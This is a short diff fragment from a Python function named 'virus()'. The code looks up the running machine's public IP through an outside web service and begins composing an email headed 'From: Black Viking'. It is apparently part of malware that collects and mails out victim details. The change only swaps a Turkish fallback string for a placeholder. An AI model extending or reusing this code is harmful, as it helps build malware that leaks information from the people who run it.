@@ -27,7 +27,7 @@ def virus():
     try:
         ip = re.findall('": "(.*?)"', urllib2.urlopen("http://my-ip.herokuapp.com/").read())[0]
     except:
-        ip = "Bulunamadi."
+        ip = "x.x.x.x"
         pass
 
     message = """From: Black Viking
